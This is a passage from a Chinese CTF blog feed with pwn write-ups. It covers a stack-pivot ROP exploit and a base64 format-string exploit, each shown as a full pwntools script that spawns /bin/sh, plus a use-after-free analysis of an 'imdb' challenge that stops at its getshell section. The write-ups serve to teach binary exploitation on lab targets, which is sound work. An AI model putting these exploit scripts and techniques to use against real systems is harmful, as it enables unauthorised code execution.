class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>main函数中存在一个0x10比特的栈溢出，可以覆盖rbp和ret，不够组rop，本题需要用<strong>栈迁移</strong>(<code>stack migrate</code>)</p><p>利用步骤:</p><ol><li>伪造rbp为bss地址，然后跳回<code>read(0, &amp;buf, 0x90uLL);</code>处扩大输入，可以发现会写入bss-0x80处。</li><li>第一段rop是泄露puts地址计算libc基址，写入第二段rop到bss+0x100，最后迁移stack到这里进行getshell。填充满0x80后溢出覆盖伪造rbp为bss-0x80，迁移stack到这里执行第一段rop。</li><li>构造第二段rop写到bss+0x100，然后迁移stack到bss+0x100执行rop。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span> )</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x0400A2B')</span></span><br><span class="line">p.recvuntil(<span class="string">'convert:\n'</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400a93</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">prsi = <span class="number">0x400a91</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">prbp = <span class="number">0x400640</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">leave = <span class="number">0x400a2b</span></span><br><span class="line">read_addr = <span class="number">0x4009fc</span></span><br><span class="line">bss = <span class="number">0x602c00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + p64(bss) + p64(read_addr) <span class="comment"># write rop1 to bss-0x80</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0xdeadbeef</span>) + p64(prdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>]) <span class="comment"># leak puts</span></span><br><span class="line">rop += p64(prsi) + p64(bss+<span class="number">0x100</span>) + p64(bss+<span class="number">0x100</span>)+ p64(prdi) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) <span class="comment"># write rop2 to bss+0x100</span></span><br><span class="line">rop += p64(prbp) + p64(bss+<span class="number">0x100</span>) + p64(leave) <span class="comment">#ret to bss+0x100</span></span><br><span class="line">rop = rop.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>) + p64(bss<span class="number">-0x80</span>) + p64(leave) <span class="comment">#ret to bss-0x80</span></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">addr_leak = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = u64(addr_leak.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] puts : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(prdi) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="base64-decoder"><a href="#base64-decoder" class="headerlink" title="base64_decoder"></a>base64_decoder</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="number">2</span>;</span><br><span class="line">  sub_80485FB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== online base64 decoder ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(aBuyIt);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the trial version, \x1B[0;31m%d\x1B[0m times left.\n"</span>, v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%255s"</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"exit"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( read_str(&amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      base64decode(&amp;s1);</span><br><span class="line">      <span class="built_in">printf</span>(&amp;s1);</span><br><span class="line">      --v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个很显示的格式化字符串漏洞，程序只能printf两次，可以泄露stack地址，修改v1然后用DynELF，或者泄露函数地址，网上找libc。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0xffe6ade0 --&gt; 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">0004| 0xffe6ade4 --&gt; 0x8048ad3 (&quot;exit&quot;)</span><br><span class="line">0008| 0xffe6ade8 --&gt; 0xffe6af08 --&gt; 0x0 </span><br><span class="line">0012| 0xffe6adec --&gt; 0x8048888 (sub    esp,0xc)</span><br><span class="line">0016| 0xffe6adf0 --&gt; 0xf7eff000 --&gt; 0x23f3c </span><br><span class="line">0020| 0xffe6adf4 --&gt; 0x8048320 (&quot;__libc_start_main&quot;)</span><br><span class="line">0024| 0xffe6adf8 --&gt; 0x2 </span><br><span class="line">0028| 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">gdb-peda$ distance 0xffe6af08 0xffe6adf8</span><br><span class="line">From 0xffe6af08 to 0xffe6adf8: -272 bytes, -68 dwords</span><br></pre></td></tr></table></figure></p><p>按照官方提示用DynELF做，脚本如下：（注意覆盖v1的时候不要溢出了）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(<span class="string">'AAAA%2$pBBBB'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">stack_addr = int(p.recvuntil(<span class="string">'BBBB'</span>)[:<span class="number">-4</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="string">'stack_addr:%x'</span>,stack_addr)</span><br><span class="line"><span class="comment">#overwrite v1</span></span><br><span class="line">payload = p32(stack_addr<span class="number">-0x110</span>)+<span class="string">'%250c%7$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">'AAAA%10$sBBB'</span> + p32(addr)</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">  p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">  info = p.recvuntil(<span class="string">'BBB'</span>)[:<span class="number">-3</span>]</span><br><span class="line">  <span class="keyword">if</span> info == <span class="string">''</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">  <span class="keyword">return</span> info</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">d = DynELF(leak,elf=elf,libcdb=<span class="keyword">False</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">success(<span class="string">'system_addr:%x'</span>,system_addr)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">'printf'</span>]:system_addr&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">p.sendline(b64encode(<span class="string">'/bin/sh\0'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;终于补完了Hgame的pwn，学到很多新姿势。&lt;/p&gt;
&lt;h3 id=&quot;guess-number&quot;&gt;&lt;a href=&quot;#guess-number&quot; class=&quot;headerlink&quot; title=&quot;guess_number&quot;&gt;&lt;/a&gt;guess_number&lt;/h3&gt;&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn-imdb</title>
    <link href="http://yoursite.com/2018/01/30/pwn-imdb/"/>
    <id>http://yoursite.com/2018/01/30/pwn-imdb/</id>
    <published>2018-01-30T01:58:32.000Z</published>
    <updated>2018-01-30T05:16:38.516Z</updated>
    
    <content type="html"><![CDATA[<p>blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。</p><h2 id="程序伪代码"><a href="#程序伪代码" class="headerlink" title="程序伪代码"></a>程序伪代码</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*** Welcome to IMDB ***"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    -- search for movies and TVs here\n----------------------------------------"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        add_tv();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        add_movie();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        remove();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序基本功能是添加tv或者movie，可以删除指定name的，以及显示所有记录。</p><h3 id="add-tv"><a href="#add-tv" class="headerlink" title="add_tv"></a>add_tv</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0xD0</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD0</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_tv;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Season? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  *(_DWORD *)(v0 + <span class="number">204</span>) = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New TV added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><h3 id="add-movie"><a href="#add-movie" class="headerlink" title="add_movie"></a>add_movie</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_movie</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">216u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD8</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_movie;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Actors? "</span>);</span><br><span class="line">  *(_QWORD *)(v0 + <span class="number">208</span>) = sub_400CC0(); <span class="comment">//这里会额外申请一块内存放数据</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New movie added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV/Movie name to remove? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v4, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)list_table[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp;&amp; !<span class="built_in">strcmp</span>(v2 + <span class="number">8</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">const</span> <span class="keyword">char</span> *, __int64 *))(*(_QWORD *)v2 + <span class="number">16L</span>L))(v2, &amp;v4);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found."</span>);</span><br><span class="line">  list_table[v1] = <span class="number">0L</span>L;   <span class="comment">//这里只清0了最后一个</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Removed successfully"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点是：remove那里可以批量删除name一样的，但是只清空了最后一个指针。</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> (**v1)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  v1 = (<span class="keyword">int</span> (**)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...))list_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (***)(<span class="keyword">void</span>))*v1)();</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != &amp;<span class="built_in">printf</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"No Movie/TV exists!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>先创建3个名字一样的tv，然后都删掉，再创建一个movie，其中movie的actor会在堆中申请一片内存写入，我们可以通过actor，伪造一个movie，可以控制actor的指针，然后show的时候就可以任意地址读了。下面是movie打印信息的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4011B0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">"Movie &lt;%s&gt;: %s rating: %.2f actors: %s\n"</span>,</span><br><span class="line">           a1 + <span class="number">8</span>,</span><br><span class="line">           a1 + <span class="number">72</span>,</span><br><span class="line">           *(_QWORD *)(a1 + <span class="number">208</span>),  <span class="comment">//这里可以用来任意地址读</span></span><br><span class="line">           *(<span class="keyword">float</span> *)(a1 + <span class="number">200</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过这个方法可以泄露出malloc地址，以及list_table地址。（可以计算magic gadget）</p><h2 id="getshell"><a href="#getshell" class="headerlink" 